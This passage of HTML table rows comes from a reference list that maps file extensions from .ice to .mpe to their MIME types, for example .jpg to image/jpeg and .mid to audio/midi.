<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.ice</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">x-conference/x-cooltalk</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.ico</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/x-icon</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.idc</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/plain</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.ief</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/ief</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.iefs</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/ief</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.iges</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/iges</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.iges</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">model/iges</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.igs</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/iges</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.igs</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">model/iges</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.ima</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-ima</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.imap</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-httpd-imap</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.inf</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/inf</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.ins</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-internett-signup</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.ip</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-ip2</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.isu</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/x-isvideo</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.it</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/it</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.iv</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-inventor</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.ivr</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">i-world/i-vrml</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.ivy</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-livescreen</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.jam</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/x-jam</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.jav</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/plain</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.jav</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-java-source</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.java</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/plain</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.java</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-java-source</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.jcm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-java-commerce</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.jfif</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/jpeg</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.jfif</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/pjpeg</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.jfif-tbnl</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/jpeg</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.jpe</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/jpeg</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.jpe</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/pjpeg</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.jpeg</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/jpeg</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.jpeg</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/pjpeg</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.jpg</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/jpeg</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.jpg</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/pjpeg</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.jps</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/x-jps</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.js</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-javascript</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.js</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/javascript</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.js</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/ecmascript</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.js</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/javascript</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.js</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/ecmascript</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.jut</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/jutvision</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.kar</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/midi</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.kar</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">music/x-karaoke</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.ksh</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-ksh</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.ksh</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-script.ksh</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.la</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/nspaudio</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.la</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/x-nspaudio</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.lam</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/x-liveaudio</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.latex</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-latex</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.lha</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/lha</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.lha</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/octet-stream</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.lha</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-lha</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.lhx</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/octet-stream</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.list</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/plain</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.lma</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/nspaudio</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.lma</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/x-nspaudio</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.log</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/plain</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.lsp</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-lisp</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.lsp</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-script.lisp</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.lst</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/plain</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.lsx</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-la-asf</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.ltx</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-latex</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.lzh</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/octet-stream</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.lzh</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-lzh</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.lzx</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/lzx</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.lzx</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/octet-stream</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.lzx</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-lzx</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.m</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/plain</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.m</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-m</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.m1v</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/mpeg</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.m2a</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/mpeg</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.m2v</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/mpeg</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.m3u</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/x-mpequrl</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.man</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-troff-man</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.map</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-navimap</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mar</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/plain</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mbd</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/mbedlet</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mc$</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-magic-cap-package-1.0</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mcd</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/mcad</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mcd</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-mathcad</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mcf</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/vasa</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mcf</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/mcf</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mcp</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/netmc</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.me</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-troff-me</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mht</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">message/rfc822</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mhtml</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">message/rfc822</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mid</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-midi</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mid</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/midi</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mid</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/x-mid</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mid</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/x-midi</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mid</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">music/crescendo</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mid</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">x-music/x-midi</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.midi</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-midi</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.midi</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/midi</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.midi</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/x-mid</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.midi</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/x-midi</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.midi</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">music/crescendo</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.midi</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">x-music/x-midi</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mif</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-frame</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mif</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-mif</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mime</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">message/rfc822</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mime</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">www/mime</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mjf</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/x-vnd.audioexplosion.mjuicemediafile</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mjpg</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/x-motion-jpeg</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/base64</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-meme</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mme</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/base64</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mod</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/mod</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mod</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/x-mod</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.moov</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/quicktime</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mov</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/quicktime</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.movie</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/x-sgi-movie</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mp2</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/mpeg</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mp2</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/x-mpeg</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mp2</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/mpeg</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mp2</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/x-mpeg</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mp2</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/x-mpeq2a</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mp3</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/mpeg3</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mp3</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/x-mpeg-3</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mp3</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/mpeg</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mp3</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/x-mpeg</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mpa</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/mpeg</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mpa</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/mpeg</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mpc</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-project</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.mpe</span></td>
